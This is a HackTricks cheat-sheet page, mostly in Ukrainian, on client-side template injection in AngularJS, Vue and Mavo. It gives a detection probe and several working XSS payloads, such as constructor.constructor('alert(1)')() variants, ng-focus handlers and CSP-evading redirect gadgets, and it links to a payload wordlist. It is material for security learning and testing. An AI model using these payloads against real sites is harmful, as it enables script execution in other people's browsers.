# Client Side Template Injection (CSTI)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Summary

–¶–µ —Å—Ö–æ–∂–µ –Ω–∞ [**Server Side Template Injection**](ssti-server-side-template-injection/), –∞–ª–µ –Ω–∞ **–∫–ª—ñ—î–Ω—Ç—ñ**. **SSTI** –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥** –Ω–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–º—É —Å–µ—Ä–≤–µ—Ä—ñ, **CSTI** –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π JavaScript** –∫–æ–¥ —É –±—Ä–∞—É–∑–µ—Ä—ñ –∂–µ—Ä—Ç–≤–∏.

**–¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è** –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –¥—É–∂–µ **—Å—Ö–æ–∂–µ** –Ω–∞ –≤–∏–ø–∞–¥–æ–∫ **SSTI**, —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä –æ—á—ñ–∫—É—î **—à–∞–±–ª–æ–Ω** —ñ –≤–∏–∫–æ–Ω–∞—î –π–æ–≥–æ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ –∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º –Ω–∞ –∫—à—Ç–∞–ª—Ç `{{ 7-7 }}`, —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ **–≤—Ä–∞–∑–ª–∏–≤–∏–π**, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ `0`, –∞ —è–∫—â–æ –Ω—ñ, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª: `{{ 7-7 }}`

## AngularJS

AngularJS - —Ü–µ —à–∏—Ä–æ–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–∏–π JavaScript —Ñ—Ä–µ–π–º–≤–æ—Ä–∫, —è–∫–∏–π –≤–∑–∞—î–º–æ–¥—ñ—î –∑ HTML —á–µ—Ä–µ–∑ –∞—Ç—Ä–∏–±—É—Ç–∏, –≤—ñ–¥–æ–º—ñ —è–∫ –¥–∏—Ä–µ–∫—Ç–∏–≤–∏, –æ–¥–Ω—ñ—î—é –∑ —è–∫–∏—Ö —î **`ng-app`**. –¶—è –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ –¥–æ–∑–≤–æ–ª—è—î AngularJS –æ–±—Ä–æ–±–ª—è—Ç–∏ HTML –≤–º—ñ—Å—Ç, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ JavaScript –≤–∏—Ä–∞–∑–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–¥–≤—ñ–π–Ω–∏—Ö —Ñ—ñ–≥—É—Ä–Ω–∏—Ö –¥—É–∂–æ–∫.

–£ —Å–∏—Ç—É–∞—Ü—ñ—è—Ö, –∫–æ–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–∏–Ω–∞–º—ñ—á–Ω–æ –≤—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –≤ HTML —Ç—ñ–ª–æ, –ø–æ–∑–Ω–∞—á–µ–Ω–µ `ng-app`, –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π JavaScript –∫–æ–¥. –¶–µ –º–æ–∂–Ω–∞ –¥–æ—Å—è–≥—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å AngularJS —É –≤–≤–µ–¥–µ–Ω–Ω—ñ. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏, —è–∫—ñ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å, —è–∫ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ JavaScript –∫–æ–¥:
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥—É–∂–µ **–±–∞–∑–æ–≤–∏–π –æ–Ω–ª–∞–π–Ω –ø—Ä–∏–∫–ª–∞–¥** –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ **AngularJS** –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/) —Ç–∞ –≤ [**Burp Suite Academy**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

{% hint style="danger" %}
[**Angular 1.6 –≤–∏–¥–∞–ª–∏–≤ –ø—ñ—Å–æ—á–Ω–∏—Ü—é**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html), —Ç–æ–º—É –∑ —Ü—ñ—î—ó –≤–µ—Ä—Å—ñ—ó –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —Ç–∞–∫–µ —è–∫ `{{constructor.constructor('alert(1)')()}}` –∞–±–æ `<input ng-focus=$event.view.alert('XSS')>`, –ø–æ–≤–∏–Ω–Ω–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏.
{% endhint %}

## VueJS

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–≤—Ä–∞–∑–ª–∏–≤—É —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—é Vue** –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)\
–ü—Ä–∞—Ü—é—é—á–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è: [`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor\(%27alert\(%22foo%22\)%27\)\(\)%7D%7D)

–ê **–¥–∂–µ—Ä–µ–ª–æ** –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É —Ç—É—Ç: [https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)
```markup
<!-- Google Research - Vue.js-->
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
```
–î—É–∂–µ —Ö–æ—Ä–æ—à–∏–π –ø–æ—Å—Ç –ø—Ä–æ CSTI —É VUE –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

### **V3**
```
{{_openBlock.constructor('alert(1)')()}}
```
–ö—Ä–µ–¥–∏—Ç: [–ì–∞—Ä–µ—Ç –•–µ–π—Å, –õ—å—é—ó—Å –ê—Ä–¥–µ—Ä–Ω —Ç–∞ PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

### **V2**
```
{{constructor.constructor('alert(1)')()}}
```
Credit: [Mario Heiderich](https://twitter.com/cure53berlin)

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –±—ñ–ª—å—à–µ VUE payloads –Ω–∞** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)

## Mavo

Payload:
```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```
**–ë—ñ–ª—å—à–µ –ø–µ–π–ª–æ–∞–¥—ñ–≤ —É** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

## **–°–ø–∏—Å–æ–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}



{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
